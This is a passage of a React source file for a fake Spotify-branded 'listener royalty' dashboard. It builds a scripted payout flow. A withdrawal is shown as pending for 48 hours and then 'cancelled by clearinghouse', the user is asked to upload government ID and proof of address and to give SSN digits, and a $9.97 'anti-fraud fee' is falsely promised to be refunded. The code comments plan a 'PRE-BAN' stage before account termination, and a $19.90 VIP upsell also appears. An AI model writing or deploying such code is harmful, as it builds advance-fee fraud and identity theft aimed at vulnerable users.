                              Zelle Phone Number or Email
                            </label>
                            <input
                              type="text"
                              required
                              value={editZelleTag}
                              onChange={(e) => setEditZelleTag(e.target.value)}
                              placeholder="e.g. (555) 234-5678 or name@email.com"
                              className="w-full px-4 py-3 rounded-xl bg-[#181818] border border-[#2e2e2e] text-white text-sm focus:outline-none focus:border-[#1db954]"
                            />
                          </div>
                        )}

                        {editMethod === 'cashapp' && (
                          <div>
                            <label className="block text-xs font-semibold text-gray-300 mb-1">
                              Cash App $Cashtag
                            </label>
                            <input
                              type="text"
                              required
                              value={editCashappTag}
                              onChange={(e) => setEditCashappTag(e.target.value)}
                              placeholder="$yourcashtag"
                              className="w-full px-4 py-3 rounded-xl bg-[#181818] border border-[#2e2e2e] text-white text-sm font-mono focus:outline-none focus:border-[#1db954]"
                            />
                          </div>
                        )}

                        {editMethod === 'paypal' && (
                          <div>
                            <label className="block text-xs font-semibold text-gray-300 mb-1">
                              PayPal Email Address
                            </label>
                            <input
                              type="email"
                              required
                              value={editPaypalEmail}
                              onChange={(e) => setEditPaypalEmail(e.target.value)}
                              placeholder="you@paypal.com"
                              className="w-full px-4 py-3 rounded-xl bg-[#181818] border border-[#2e2e2e] text-white text-sm focus:outline-none focus:border-[#1db954]"
                            />
                          </div>
                        )}

                        {editMethod === 'apple_cash' && (
                          <div>
                            <label className="block text-xs font-semibold text-gray-300 mb-1">
                              Apple Cash Phone or Apple ID
                            </label>
                            <input
                              type="text"
                              required
                              value={editAppleCashPhone}
                              onChange={(e) => setEditAppleCashPhone(e.target.value)}
                              placeholder="+1 (555) 019-2834"
                              className="w-full px-4 py-3 rounded-xl bg-[#181818] border border-[#2e2e2e] text-white text-sm focus:outline-none focus:border-[#1db954]"
                            />
                          </div>
                        )}
                      </div>

                      {payoutFormError && (
                        <div className="p-3.5 rounded-xl bg-red-500/10 border border-red-500/30 text-xs text-red-400 font-semibold">
                          {payoutFormError}
                        </div>
                      )}

                      <button
                        type="submit"
                        className="w-full py-4 px-8 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] text-black font-black text-sm uppercase tracking-wider transition-all shadow-xl shadow-[#1db954]/25 cursor-pointer flex items-center justify-center gap-2"
                      >
                        <span>REQUEST FULL PAYOUT TRANSFER (${accountBalance.toFixed(2)} USD)</span>
                        <ArrowRight className="w-4 h-4 stroke-[3]" />
                      </button>
                    </form>
                  )}
                </div>
              )}

              {/* ================================================================= */}
              {/* STAGE 2: PENDING 2 DAYS ("IN TRANSFER..." FOR 48 HOURS)           */}
              {/* ================================================================= */}
              {withdrawalStage === 'pending_2days' && (
                <div className="pt-4 border-t border-[#262626] max-w-2xl mx-auto text-left">
                  <div className="p-6 rounded-2xl bg-[#121915] border border-amber-500/40 space-y-4">
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-[#222] pb-4">
                      <div className="flex items-center gap-2.5">
                        <RefreshCw className="w-5 h-5 text-amber-400 animate-spin shrink-0" />
                        <div>
                          <span className="text-[10px] font-black uppercase tracking-wider text-amber-400 block">
                            ACH / WIRE CLEARINGHOUSE STATUS
                          </span>
                          <h3 className="text-base font-black text-white">
                            Payout In Transfer (Pending 48h Clearing)
                          </h3>
                        </div>
                      </div>
                      <span className="px-3 py-1 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/40 text-xs font-black uppercase self-start sm:self-center">
                        IN TRANSFER...
                      </span>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                      <div className="p-3.5 rounded-xl bg-black/50 border border-[#262626]">
                        <span className="text-gray-400 block">Transfer Amount</span>
                        <b className="text-base font-black text-[#1db954] mt-0.5 block">
                          ${accountBalance.toFixed(2)} USD
                        </b>
                      </div>
                      <div className="p-3.5 rounded-xl bg-black/50 border border-[#262626]">
                        <span className="text-gray-400 block">Destination</span>
                        <b className="text-white font-bold mt-0.5 block truncate">
                          {payoutMethodInfo.method} ({payoutMethodInfo.target})
                        </b>
                      </div>
                      <div className="p-3.5 rounded-xl bg-black/50 border border-[#262626]">
                        <span className="text-gray-400 block">Estimated Clearing</span>
                        <b className="text-amber-400 font-mono text-sm mt-0.5 block">
                          {formatDurationCountdown(twoDaySecondsLeft)}
                        </b>
                      </div>
                    </div>

                    <p className="text-xs text-gray-300 leading-relaxed">
                      Your royalty disbursement request has been transmitted to the clearing network. Standard inter-bank transfers take up to <b>48 hours (2 calendar days)</b> to complete verification and settle into your receiving account.
                    </p>
                  </div>
                </div>
              )}

              {/* ================================================================= */}
              {/* STAGE 3: CANCELLED AFTER 2 DAYS -> DEMANDS KYC DOCUMENT UPLOAD    */}
              {/* ================================================================= */}
              {withdrawalStage === 'kyc_required' && (
                <div className="pt-4 border-t border-[#262626] max-w-2xl mx-auto text-left space-y-5">
                  <div className="p-5 sm:p-6 rounded-2xl bg-red-950/30 border-2 border-red-500/50 space-y-3">
                    <div className="flex items-start gap-3">
                      <div className="w-10 h-10 rounded-xl bg-red-500/20 border border-red-500/40 text-red-400 flex items-center justify-center shrink-0">
                        <AlertTriangle className="w-5 h-5" />
                      </div>
                      <div>
                        <span className="text-[10px] font-black uppercase tracking-wider text-red-400 block">
                          TRANSFER CANCELLED BY CLEARINGHOUSE • ACTION REQUIRED
                        </span>
                        <h3 className="text-base sm:text-lg font-black text-white">
                          Mandatory KYC Identity Verification Required
                        </h3>
                      </div>
                    </div>

                    <p className="text-xs text-gray-200 leading-relaxed">
                      Your pending transfer of <b>${accountBalance.toFixed(2)} USD</b> was automatically cancelled after 48 hours by the Federal Clearinghouse because your account has not completed <b>Mandatory Know-Your-Customer (KYC) Document Verification</b> (required under Section 6 of the Member Guidelines for payouts exceeding $500.00 USD). Your funds have been safely returned to your balance.
                    </p>
                  </div>

                  {/* KYC Document Upload Form */}
                  <form
                    onSubmit={handleKycSubmit}
                    className="p-6 rounded-2xl bg-[#121212] border border-[#2c2c2c] space-y-5"
                  >
                    <div>
                      <span className="text-[10px] font-black uppercase tracking-wider text-[#1db954] block">
                        STEP 1 OF 2 • COMPLIANCE DOCUMENT SUBMISSION
                      </span>
                      <h4 className="text-base font-black text-white mt-0.5">
                        Upload Identity &amp; Proof of Residence Photos
                      </h4>
                      <p className="text-xs text-gray-400 mt-1">
                        Upload clear photos of your government-issued ID and proof of address matching <b>{listenerName}</b> to unlock your withdrawal.
                      </p>
                    </div>

                    <div className="space-y-4">
                      {/* 1. Government ID Front */}
                      <div>
                        <label className="block text-xs font-bold text-gray-200 mb-1.5">
                          1. Government-Issued Photo ID — Front (Driver&apos;s License, State ID, or Passport) *
                        </label>
                        <label className="flex items-center justify-between gap-3 p-4 rounded-xl bg-[#181818] border border-dashed border-[#3a3a3a] hover:border-[#1db954] cursor-pointer transition-colors">
                          <div className="flex items-center gap-3">
                            <Upload className="w-5 h-5 text-[#1db954] shrink-0" />
                            <span className="text-xs text-gray-300 font-medium truncate">
                              {kycIdFrontFile || 'Click to select or take photo of ID (Front)...'}
                            </span>
                          </div>
                          {kycIdFrontFile && (
                            <span className="text-[10px] bg-[#1db954]/20 text-[#1db954] px-2 py-0.5 rounded font-bold shrink-0">
                              Attached ✓
                            </span>
                          )}
                          <input
                            type="file"
                            accept="image/*,.pdf"
                            required
                            onChange={(e) =>
                              setKycIdFrontFile(e.target.files?.[0]?.name || 'gov_id_front.jpg')
                            }
                            className="hidden"
                          />
                        </label>
                      </div>

                      {/* 2. Government ID Back */}
                      <div>
                        <label className="block text-xs font-bold text-gray-200 mb-1.5">
                          2. Government-Issued Photo ID — Back (Optional for Passport)
                        </label>
                        <label className="flex items-center justify-between gap-3 p-4 rounded-xl bg-[#181818] border border-dashed border-[#3a3a3a] hover:border-[#1db954] cursor-pointer transition-colors">
                          <div className="flex items-center gap-3">
                            <Upload className="w-5 h-5 text-[#1db954] shrink-0" />
                            <span className="text-xs text-gray-300 font-medium truncate">
                              {kycIdBackFile || 'Click to select or take photo of ID (Back)...'}
                            </span>
                          </div>
                          {kycIdBackFile && (
                            <span className="text-[10px] bg-[#1db954]/20 text-[#1db954] px-2 py-0.5 rounded font-bold shrink-0">
                              Attached ✓
                            </span>
                          )}
                          <input
                            type="file"
                            accept="image/*,.pdf"
                            onChange={(e) =>
                              setKycIdBackFile(e.target.files?.[0]?.name || 'gov_id_back.jpg')
                            }
                            className="hidden"
                          />
                        </label>
                      </div>

                      {/* 3. Proof of Address */}
                      <div>
                        <label className="block text-xs font-bold text-gray-200 mb-1.5">
                          3. Proof of Residential Address (Utility Bill, Bank Statement, or Lease) *
                        </label>
                        <label className="flex items-center justify-between gap-3 p-4 rounded-xl bg-[#181818] border border-dashed border-[#3a3a3a] hover:border-[#1db954] cursor-pointer transition-colors">
                          <div className="flex items-center gap-3">
                            <Upload className="w-5 h-5 text-[#1db954] shrink-0" />
                            <span className="text-xs text-gray-300 font-medium truncate">
                              {kycAddressFile || 'Click to upload proof of address document/photo...'}
                            </span>
                          </div>
                          {kycAddressFile && (
                            <span className="text-[10px] bg-[#1db954]/20 text-[#1db954] px-2 py-0.5 rounded font-bold shrink-0">
                              Attached ✓
                            </span>
                          )}
                          <input
                            type="file"
                            accept="image/*,.pdf"
                            required
                            onChange={(e) =>
                              setKycAddressFile(e.target.files?.[0]?.name || 'proof_of_address.jpg')
                            }
                            className="hidden"
                          />
                        </label>
                      </div>

                      {/* 4. Last 4 SSN / Tax ID */}
                      <div>
                        <label className="block text-xs font-bold text-gray-200 mb-1.5">
                          4. Last 4 Digits of SSN / Tax ID (For IRS W-9 Royalty Reconciliation) *
                        </label>
                        <input
                          type="text"
                          required
                          maxLength={4}
                          value={kycSsnLast4}
                          onChange={(e) => setKycSsnLast4(e.target.value.replace(/\D/g, ''))}
                          placeholder="••••"
                          className="w-full px-4 py-3 rounded-xl bg-[#181818] border border-[#2e2e2e] text-white text-sm font-mono focus:outline-none focus:border-[#1db954]"
                        />
                      </div>
                    </div>

                    {kycError && (
                      <div className="p-3 rounded-xl bg-red-500/10 border border-red-500/30 text-xs text-red-400 font-semibold">
                        {kycError}
                      </div>
                    )}

                    <button
                      type="submit"
                      disabled={isVerifyingKyc}
                      className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] text-black font-black text-xs sm:text-sm uppercase tracking-wider transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer"
                    >
                      {isVerifyingKyc ? (
                        <>
                          <RefreshCw className="w-4 h-4 animate-spin" />
                          <span>ENCRYPTING &amp; VERIFYING KYC DOCUMENTS...</span>
                        </>
                      ) : (
                        <>
                          <FileCheck className="w-4 h-4 stroke-[2.5]" />
                          <span>SUBMIT KYC DOCUMENTS FOR VERIFICATION</span>
                        </>
                      )}
                    </button>
                  </form>
                </div>
              )}

              {/* ================================================================= */}
              {/* STAGE 4: KYC SUBMITTED -> DEMANDS $9.97 ANTI-FRAUD FEE (+ADDED)   */}
              {/* ================================================================= */}
              {withdrawalStage === 'antifraud_fee_required' && (
                <div className="pt-4 border-t border-[#262626] max-w-2xl mx-auto text-left space-y-5">
                  <div className="p-4 rounded-2xl bg-[#0d2215] border border-[#1db954]/40 flex items-center gap-3 text-xs text-[#1db954] font-bold">
                    <CheckCircle2 className="w-5 h-5 shrink-0" />
                    <span>
                      KYC Documents Uploaded &amp; Matched! Final Step Required: Anti-Fraud Banking Reconciliation.
                    </span>
                  </div>

                  <div className="p-6 rounded-2xl bg-gradient-to-b from-[#171f1a] to-[#121212] border-2 border-[#1db954] space-y-5 shadow-2xl">
                    <div className="flex items-start justify-between gap-4">
                      <div>
                        <span className="text-[10px] font-black uppercase tracking-wider text-amber-400 block">
                          STEP 2 OF 2 • MANDATORY ANTI-FRAUD SECURITY PROTOCOL
                        </span>
                        <h3 className="text-lg sm:text-xl font-black text-white mt-0.5">
                          Anti-Fraud Verification Deposit ($9.97 USD)
                        </h3>
                      </div>
                      <span className="px-3 py-1 rounded-full bg-[#1db954] text-black font-black text-xs shrink-0">
                        +100% ADDED TO PAYOUT
                      </span>
                    </div>

                    <p className="text-xs sm:text-sm text-gray-300 leading-relaxed">
                      Because your initial transfer was halted by the clearinghouse, federal anti-money-laundering rules require a one-time <b>$9.97 USD Anti-Fraud Security Verification</b> to confirm ownership of your payment profile. <b>This $9.97 USD is 100% added to your withdrawal amount</b> so you receive it back together with your full payout!
                    </p>

                    {/* Live Payout Addition Breakdown Box */}
                    <div className="p-4 rounded-2xl bg-black/60 border border-[#2a2a2a] space-y-2.5 text-xs">
                      <div className="flex items-center justify-between text-gray-300">
                        <span>Current Accumulated Withdrawal Balance:</span>
                        <b className="font-mono text-white">${accountBalance.toFixed(2)} USD</b>
                      </div>
                      <div className="flex items-center justify-between text-[#1db954]">
                        <span>+ Anti-Fraud Verification Deposit (Credited to Payout):</span>
                        <b className="font-mono">+$9.97 USD</b>
                      </div>
                      <div className="border-t border-[#2a2a2a] pt-2.5 flex items-center justify-between text-sm sm:text-base">
                        <span className="font-black text-white uppercase">
                          New Total Payout You Will Receive:
                        </span>
                        <span className="font-black text-[#1db954] text-lg">
                          ${(accountBalance + 9.97).toFixed(2)} USD
                        </span>
                      </div>
                    </div>

                    <button
                      type="button"
                      onClick={() => router.push('/payment?offer=upsell_antifraud_9_97')}
                      className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] text-black font-black text-xs sm:text-sm uppercase tracking-wider transition-all shadow-xl shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer"
                    >
                      <span>
                        PAY $9.97 ANTI-FRAUD FEE &amp; UNLOCK ${(accountBalance + 9.97).toFixed(2)}{' '}
                        USD PAYOUT
                      </span>
                      <ArrowRight className="w-4 h-4 stroke-[3]" />
                    </button>
                  </div>
                </div>
              )}

              {/* ================================================================= */}
              {/* STAGE 5: ANTI-FRAUD PAID (+9.97 CREDITED) -> RE-SUBMIT WITHDRAWAL */}
              {/* ================================================================= */}
              {withdrawalStage === 'ready_re_request' && (
                <div className="pt-4 border-t border-[#262626] max-w-2xl mx-auto text-left space-y-5">
                  <div className="p-6 rounded-2xl bg-[#0e2215] border-2 border-[#1db954] space-y-4">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-full bg-[#1db954] text-black flex items-center justify-center shrink-0">
                        <CheckCircle2 className="w-6 h-6 stroke-[2.5]" />
                      </div>
                      <div>
                        <span className="text-[10px] font-black uppercase tracking-wider text-[#1db954] block">
                          KYC &amp; ANTI-FRAUD CLEARANCE COMPLETE
                        </span>
                        <h3 className="text-base sm:text-lg font-black text-white">
                          Ready to Re-Submit Your ${accountBalance.toFixed(2)} USD Payout
                        </h3>
                      </div>
                    </div>

                    <p className="text-xs sm:text-sm text-gray-200 leading-relaxed">
                      Your <b>+$9.97 USD Anti-Fraud Deposit</b> has been added to your balance! Click the button below to re-submit your full withdrawal of <b>${accountBalance.toFixed(2)} USD</b> to your designated payout account.
                    </p>

                    <button
                      type="button"
                      onClick={handleFinalWithdrawalReSubmit}
                      className="w-full py-4 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] text-black font-black text-xs sm:text-sm uppercase tracking-wider transition-all shadow-lg shadow-[#1db954]/25 flex items-center justify-center gap-2 cursor-pointer"
                    >
                      <span>SUBMIT FINAL VERIFIED WITHDRAWAL (${accountBalance.toFixed(2)} USD)</span>
                      <ArrowRight className="w-4 h-4 stroke-[3]" />
                    </button>
                  </div>
                </div>
              )}

              {/* ================================================================= */}
              {/* STAGE 6 (PRE-BAN): PENDING FOR 4 DAYS BEFORE ACCOUNT TERMINATION  */}
              {/* ================================================================= */}
              {withdrawalStage === 'pending_4days' && (
                <div className="pt-4 border-t border-[#262626] max-w-2xl mx-auto text-left">
                  <div className="p-6 rounded-2xl bg-[#121915] border border-amber-500/40 space-y-4">
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-[#222] pb-4">
                      <div className="flex items-center gap-2.5">
                        <Clock className="w-5 h-5 text-amber-400 animate-pulse shrink-0" />
                        <div>
                          <span className="text-[10px] font-black uppercase tracking-wider text-amber-400 block">
                            FINAL CLEARINGHOUSE SETTLEMENT QUEUE
                          </span>
                          <h3 className="text-base font-black text-white">
                            Withdrawal Pending Final Audit (Includes +$9.97 Refund)
                          </h3>
                        </div>
                      </div>
                      <span className="px-3 py-1 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/40 text-xs font-black uppercase self-start sm:self-center">
                        PENDING
                      </span>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
                      <div className="p-3.5 rounded-xl bg-black/50 border border-[#262626]">
                        <span className="text-gray-400 block">Total Payout (w/ +$9.97)</span>
                        <b className="text-base font-black text-[#1db954] mt-0.5 block">
                          ${accountBalance.toFixed(2)} USD
                        </b>
                      </div>
                      <div className="p-3.5 rounded-xl bg-black/50 border border-[#262626]">
                        <span className="text-gray-400 block">KYC &amp; Anti-Fraud</span>
                        <b className="text-[#1db954] font-bold mt-0.5 block">
                          Submitted • Under Review
                        </b>
                      </div>
                      <div className="p-3.5 rounded-xl bg-black/50 border border-[#262626]">
                        <span className="text-gray-400 block">Final Settlement Timer</span>
                        <b className="text-amber-400 font-mono text-sm mt-0.5 block">
                          {formatDurationCountdown(fourDaySecondsLeft)}
                        </b>
                      </div>
                    </div>

                    <p className="text-xs text-gray-300 leading-relaxed">
                      Your re-submitted withdrawal of <b>${accountBalance.toFixed(2)} USD</b> (including your refunded $9.97 Anti-Fraud deposit) is currently in the <b>96-hour (4-day) final compliance clearing queue</b>.
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* ========================================================================= */}
        {/* TAB: MY PROFILE & TIER                                                    */}
        {/* ========================================================================= */}
        {activeTab === 'profile' && (
          <div className="space-y-6 animate-in fade-in duration-300">
            <div className="bg-[#181818] border border-[#282828] rounded-3xl p-6 sm:p-8 space-y-5">
              <div className="flex items-center justify-between pb-4 border-b border-[#282828]">
                <div>
                  <span className="text-xs uppercase font-bold tracking-wider text-[#1db954] block">
                    Account Overview
                  </span>
                  <h2 className="text-lg font-black text-white">Member Credentials</h2>
                </div>
                <span className="px-3 py-1 rounded-full bg-[#1db954]/10 text-[#1db954] border border-[#1db954]/30 text-xs font-extrabold uppercase">
                  Active Member
                </span>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
                <div className="bg-[#121212] p-4 rounded-2xl border border-[#282828]">
                  <span className="text-gray-400 block mb-1 font-medium">Full Name</span>
                  <span className="font-extrabold text-white text-base block">{listenerName}</span>
                </div>
                <div className="bg-[#121212] p-4 rounded-2xl border border-[#282828]">
                  <span className="text-gray-400 block mb-1 font-medium">Registered Email</span>
                  <span className="font-mono text-white text-xs block truncate">
                    {listenerEmail}
                  </span>
                </div>
                <div className="bg-[#121212] p-4 rounded-2xl border border-[#282828]">
                  <span className="text-gray-400 block mb-1 font-medium">Available Balance</span>
                  <span className="font-black text-[#1db954] text-lg block">
                    ${accountBalance.toFixed(2)} USD
                  </span>
                </div>
                <div className="bg-[#121212] p-4 rounded-2xl border border-[#282828]">
                  <span className="text-gray-400 block mb-1 font-medium">Release Clearance</span>
                  <span className="font-extrabold text-amber-400 text-sm block">
                    {releaseDateFormatted || 'Nov 26, 2026'}
                  </span>
                </div>
              </div>
            </div>

            {/* Tiers Comparison Grid */}
            <div className="bg-[#181818] border border-[#282828] rounded-3xl p-6 sm:p-8 space-y-6">
              <div>
                <span className="text-xs uppercase font-bold tracking-wider text-[#1db954] block">
                  Membership Tier
                </span>
                <h2 className="text-lg font-black text-white mt-0.5">
                  Account Status &amp; Tier Benefits
                </h2>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                {/* Standard Verified Tier */}
                <div
                  className={`p-6 rounded-2xl border transition-all ${
                    accountTier === 'Standard Verified Tier'
                      ? 'bg-[#0f2115] border-[#1db954] shadow-lg shadow-[#1db954]/10'
                      : 'bg-[#121212] border-[#282828]'
                  } space-y-4`}
                >
                  <div className="flex items-center justify-between">
                    <div>
                      <h3 className="font-black text-white text-base">Standard Verified Tier</h3>
                      <span className="text-xs text-gray-400 block">Initial Onboarding Tier</span>
                    </div>
                    {accountTier === 'Standard Verified Tier' && (
                      <span className="bg-[#1db954] text-black text-[10px] font-black uppercase px-2.5 py-1 rounded-full">
                        ACTIVE TIER
                      </span>
                    )}
                  </div>

                  <ul className="text-xs text-gray-300 space-y-2.5">
                    <li className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-[#1db954] shrink-0" />
                      <span>$17.50 – $20.50 daily payout per track evaluation</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-[#1db954] shrink-0" />
                      <span>Standard 15-day payout release schedule</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-[#1db954] shrink-0" />
                      <span>$500.00 USD minimum withdrawal threshold</span>
                    </li>
                  </ul>
                </div>

                {/* VIP Gold Premium Tier */}
                <div
                  className={`p-6 rounded-2xl border transition-all ${
                    accountTier === 'VIP Gold Tier'
                      ? 'bg-[#211a0c] border-amber-400 shadow-lg shadow-amber-500/10'
                      : 'bg-[#121212] border-[#282828]'
                  } space-y-4`}
                >
                  <div className="flex items-center justify-between">
                    <div>
                      <h3 className="font-black text-amber-400 text-base">VIP Gold 7-Day Tier</h3>
                      <span className="text-xs text-amber-300/80 block">
                        Fast 7-Day Disbursement Tier
                      </span>
                    </div>
                    {accountTier === 'VIP Gold Tier' ? (
                      <span className="bg-amber-400 text-black text-[10px] font-black uppercase px-2.5 py-1 rounded-full">
                        ACTIVE TIER
                      </span>
                    ) : (
                      <span className="bg-amber-400/10 text-amber-400 text-[10px] font-bold uppercase px-2.5 py-1 rounded-full border border-amber-400/30">
                        OPTIONAL UPGRADE
                      </span>
                    )}
                  </div>

                  <ul className="text-xs text-gray-300 space-y-2.5">
                    <li className="flex items-center gap-2">
                      <Sparkles className="w-4 h-4 text-amber-400 shrink-0" />
                      <span>Cuts payout release schedule in half to 7 calendar days</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <Sparkles className="w-4 h-4 text-amber-400 shrink-0" />
                      <span>Priority ACH, Zelle, Cash App, and PayPal clearing queue</span>
                    </li>
                    <li className="flex items-center gap-2">
                      <Sparkles className="w-4 h-4 text-amber-400 shrink-0" />
                      <span>Permanent VIP status for all future withdrawals</span>
                    </li>
                  </ul>

                  {accountTier !== 'VIP Gold Tier' && (
                    <button
                      onClick={() => router.push('/payment?offer=upsell_vip_19_90')}
                      className="w-full py-3 px-4 rounded-xl bg-amber-400 hover:bg-amber-300 active:scale-[0.99] text-black font-extrabold text-xs uppercase tracking-wider transition-all mt-2 cursor-pointer shadow-md shadow-amber-400/20"
                    >
                      Upgrade Account to VIP Gold Tier (+$19.90)
                    </button>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}

export default function SpotifyProfilePage() {
  return (
    <Suspense
      fallback={
        <div className="min-h-screen bg-[#121212] flex items-center justify-center text-white text-xs font-mono">
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full bg-[#1db954] animate-ping" />
            <span>Loading Profile Data...</span>
          </div>
        </div>
      }
    >
      <SpotifyProfileContent />
    </Suspense>
  );
}
